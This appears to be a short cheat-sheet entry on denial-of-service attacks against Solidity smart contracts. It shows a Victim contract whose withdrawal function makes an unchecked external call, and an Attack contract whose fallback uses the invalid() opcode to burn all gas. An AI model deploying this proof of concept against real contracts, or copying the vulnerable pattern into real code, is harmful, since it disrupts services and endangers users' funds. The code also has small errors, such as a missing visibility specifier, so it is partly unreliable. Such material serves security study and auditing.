# DoS Attack for Smart Contract

We can denial the Solidity execution by consuming all gas using various ways.

### DoS with Assembly Invalid Function <a href="#dos-with-assembly-invalid-function" id="dos-with-assembly-invalid-function"></a>

The `invalid()` opcode in in-line assembly consumes all the gas and causes Dos for the contract.

```shellscript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Victim {
    address public owner;
    uint public balance;

    function withdrawUser(address _address) {
        (bool success, ) = _address.call{value: balance}("");
        // Some code ...
    }
}

contract Attack {
  Victim target;

  constructor(address _targetAddress) {
    target = Victim(_targetAddress);
    target.withdrawUser(address(this));
  }

  fallback() payable external {
    assembly {
      invalid()
    }
  }
}
```
